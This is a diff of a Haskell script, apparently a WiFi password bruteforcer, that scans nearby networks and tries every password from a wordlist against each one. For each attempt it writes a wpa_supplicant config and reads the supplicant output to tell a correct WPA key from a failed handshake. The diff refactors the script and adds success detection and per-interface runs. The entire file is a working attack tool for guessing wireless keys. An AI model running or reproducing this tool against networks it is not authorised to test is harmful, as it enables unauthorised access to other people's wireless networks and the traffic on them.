@@ -1,121 +1,88 @@
 #!/usr/bin/env runhaskell
 
-{-# LANGUAGE OverloadedStrings #-}
-{-# LANGUAGE ExtendedDefaultRules #-}
-{-# LANGUAGE NoImplicitPrelude #-}
-{-# OPTIONS_GHC -fno-warn-type-defaults #-}
-
 module Main where
 
 import Control.Arrow
-
+import Data.List
 import Data.Maybe
-import Data.Text
-import Data.Text.IO
-import Prelude (IO, (.), ($), fmap, Eq (..), Show (..)
-    , return, sequence, (>>), (>>=), Bool (..), otherwise, Int, (*), div)
-import qualified Prelude (filter, dropWhile, take, length)
-import Shelly
+import GHC.IO.Handle
 import System.Environment
-default (Text)
+import System.Process
 
-data Status = Right Text | Wrong Text | Error Text | Proceed Text deriving (Eq, Show)
+data Status = Good String | Wrong String | Error String | Proceed String deriving (Eq, Show)
 
 timeout :: Int
 timeout = 10
 
 main :: IO ()
 main = do
-    (interface:passwordFile:freeArgs) <- (fmap . fmap $ pack) getArgs
+    ( interface : passwordFile : freeArgs ) <- getArgs
+    putStrLn $ "=== launch on interface [ " ++ interface ++ " ] ==="
+
     putStrLn "--- listing networks ---"
-    runner "ip" ["link", "set", interface, "up"]
-    
+    readProcess "ip" ["link", "set", interface, "up"] ""
     networks <- case freeArgs of
             [] -> iwlist interface
-            _  -> return freeArgs
-    passwords <- (fmap lines) . readFile . unpack $ passwordFile
+            _  -> fmap (intersect freeArgs) $ iwlist interface 
+    if length networks == 0
+        then errorWithoutStackTrace "No networks found."
+        else return ()
+    passwords <- fmap lines $ readFile passwordFile
+    showPreamble networks passwords
 
-    let howManyNetworks = Prelude.length networks
-    let howManyPasswords = Prelude.length passwords
-    let howManyIterations = howManyNetworks * howManyPasswords
-    let rawTiming = howManyIterations * timeout
-    let humanTiming = rawTiming `div` 60
-
-    putStrLn . concat $ [ "[ networks :: ", pack . show $ howManyNetworks, " ] "
-                      , "[ passwords :: ", pack . show $ howManyPasswords, " ] "
-                      , "[ total :: " , pack . show $ howManyIterations , " ]"
-                      ]
-
-    putStrLn . concat $ [ "Expected timing: ", pack . show $ humanTiming, " minutes." ]
     putStrLn "--- scan initiated ---"
 
-    results <- sequence [ innerLoop interface network password
+    results <- sequence [ attempt interface network password
                         | network <- networks
                         , password <- passwords
                         ]
+
     putStrLn "--- scan completed ---"
 
-
-innerLoop :: Text -> Text -> Text -> IO Text
-innerLoop interface network password = report >> conf network password >>= supplicant interface
     where
-    report = putStr . concat $ [ "[ ", network, " ] [ ", password, " ] -- " ]
 
-runner cmd args = shelly . silently $ run cmd args
+    showPreamble networks passwords = putStrLn . concat $
+            [ "[ networks :: ", show . length $ networks, " ] "
+            , "[ passwords :: ", show . length $ passwords, " ] "
+            , "[ total :: " , show $ length networks * length passwords, " ]"
+            , "\n"
+            , "Expected timing: "
+            , show $ length networks * length passwords * timeout `div` 60
+            , " minutes."
+            ]
 
-iwlist :: Text -> IO [Text]
+attempt :: String -> String -> String -> IO ((String, String), Status)
+attempt interface network password
+    =   reportPrefix
+    >>  conf interface network password
+    >>= supplicant interface
+    >>= reportStatus
+
+    where
+    reportPrefix = putStr . concat $ [ "[ ", network, " ] [ ", password, " ] -- " ]
+    reportStatus status = (putStrLn . show) status >> return ((network, password), status)
+
+iwlist :: String -> IO [String]
 iwlist interface = fmap parse output
     where
-    output :: IO Text
-    output = runner "iwlist" [interface, "scanning"]
+    output :: IO String
+    output = readProcess "iwlist" [interface, "scanning"] ""
 
-    parse :: Text -> [Text]
+    parse :: String -> [String]
     parse = lines
-        >>> fmap stripStart
-        >>> Prelude.filter (isPrefixOf "ESSID:")
+        >>> fmap (dropWhile (== ' '))
+        >>> filter (isPrefixOf "ESSID:")
         >>> fmap (drop 6)
-        >>> fmap (drop 1 >>> dropEnd 1)
+        >>> fmap (tail >>> init)
 
-supplicant :: Text -> Text -> IO Text
-supplicant interface conf = shelly . silently . (errExit False) $ do
-    log <- fmap lines $ run "timeout"
-        [ (pack.show) timeout
-        , "wpa_supplicant"
-        , "-P", concat [ "/run/wpa_supplicant_", interface, ".pid" ]
-        , "-i", interface
-        , "-D", "wext"
-        , "-C", "/run/wpa_supplicant"
-        , "-c", conf
-        ]
-    echo (evaluateInput log)
-    return (evaluateInput log)
-
-    where
-    evaluateInput :: [Text] -> Text
-    evaluateInput = fmap strategy
-        >>> Prelude.take 10
-        >>> Prelude.dropWhile (isProceed)
-        >>> listToMaybe
-        >>> maybe "No result!" (pack.show)
-
-    isProceed (Proceed _) = True
-    isProceed _ = False
-
-    strategy :: Text -> Status
-    strategy message
-        | "4-Way Handshake failed" `isInfixOf` message = Wrong message
-        | "timed out" `isInfixOf` message = Error message
-        | "Association request to the driver failed" `isInfixOf` message = Error message
-        | otherwise = Proceed message
-
-conf :: Text -> Text -> IO Text
-conf network password = do
-    writeFile (unpack conf) text
+conf :: String -> String -> String -> IO String
+conf interface network password = do
+    writeFile conf text
     return conf
     where
-    conf = "/tmp/wifi-bruteforce.tmp"
+    conf = "/tmp/wifi-bruteforce." ++ interface ++ ".tmp"
     text = concat
-        [ "ctrl_interface=/run/wpa_supplicant\n"
+        [ "ctrl_interface=/run/wpa_supplicant_" ++ interface ++ "\n"
         , "ctrl_interface_group=wheel\nnetwork={\n    key_mgmt=WPA-PSK\n    psk=\""
         , password
         , "\"\n    ssid=\""
@@ -123,4 +90,41 @@ conf network password = do
         , "\"\n}"
         ]
 
+supplicant :: String -> String -> IO Status
+supplicant interface conf = do
+    (in_, out, err, pid) <- createProcess $ processDescription { std_out = CreatePipe }
+    res <- case out of
+        (Just handle) -> getToken handle
+        _ -> error "Unable to get hold of wpa_supplicant stdout."
+    case res of
+        (Good _) -> terminateProcess pid >> waitForProcess pid
+        (_) -> waitForProcess pid
+    return res
+
+    where
+    processDescription = proc "wpa_supplicant"
+        [ "-P", concat [ "/run/wpa_supplicant_", interface, ".pid" ]
+        , "-i", interface
+        , "-D", "nl80211,wext"
+        , "-C", "/run/wpa_supplicant_" ++ interface
+        , "-c", conf
+        ]
+
+    getToken = getToken' 0
+    getToken' i handle
+        | i > 10 = return (Wrong "No definite result.")
+        | otherwise = do
+        token <- tokenize `fmap` hGetLine handle
+        case token of 
+            (Proceed _) -> putStrLn (show token) >> getToken' (i + 1) handle
+            _ -> return token
+
+    tokenize :: String -> Status
+    tokenize message
+        | "Key negotiation completed" `isInfixOf` message = Good message
+        | "4-Way Handshake failed" `isInfixOf` message = Wrong message
+        | "timed out" `isInfixOf` message = Error message
+        | "ioctl" `isInfixOf` message = Error message
+        | "Association request to the driver failed" `isInfixOf` message = Error message
+        | otherwise = Proceed message
 
